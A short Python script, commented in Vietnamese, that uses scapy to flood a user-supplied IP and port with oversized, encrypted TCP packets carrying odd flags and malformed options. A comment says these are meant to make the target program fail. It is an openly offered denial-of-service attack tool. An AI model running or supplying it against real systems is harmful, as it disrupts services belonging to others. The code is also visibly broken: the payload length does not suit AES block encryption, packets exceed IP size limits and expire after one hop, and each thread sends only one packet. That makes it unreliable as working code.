###
import random
import threading
import time
from scapy.all import *
from Crypto.Cipher import AES

# Nhập các giá trị từ người dùng
target_ip = input("IP: ")
target_port = int(input("port: "))
run_time = int(input("time: "))
num_threads = int(input("thread: "))

# Khởi tạo danh sách payload để sử dụng cho từng thread
payloads = [bytes([random.randint(0, 255) for _ in range(65534)]) for _ in range(num_threads)]

# Hàm để gửi packet
def send_packet(payload):
    # Mã hóa tải trọng bằng AES
    key = b''.join([bytes([random.randint(0, 255)]) for _ in range(16)])
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_payload = cipher.encrypt(payload)
    
    # Tạo TCP packet với tải trọng đã mã hóa
    packet = IP(dst=target_ip, ttl=1) / TCP(dport=target_port, flags="FPU", options=[("MSS", 1460), ("NOP", None), ("WScale", 10), ("SAckOK", b"")]) / Raw(load=encrypted_payload)
    
    # Thêm các headers gây lỗi cho chương trình
    packet[TCP].options += [("Timestamp", (1, 1))]
    packet[TCP].options += [("Unknown", b"\x00" * 8)]
    
    # Gửi packet
    send(packet, verbose=False)

# Tạo danh sách thread
threads = []
for i in range(num_threads):
    t = threading.Thread(target=send_packet, args=(payloads[i],))
    threads.append(t)

# Bắt đầu chạy các thread
for t in threads:
    t.start()

# Đợi cho các thread chạy trong khoảng thời gian đã nhập
time.sleep(run_time)
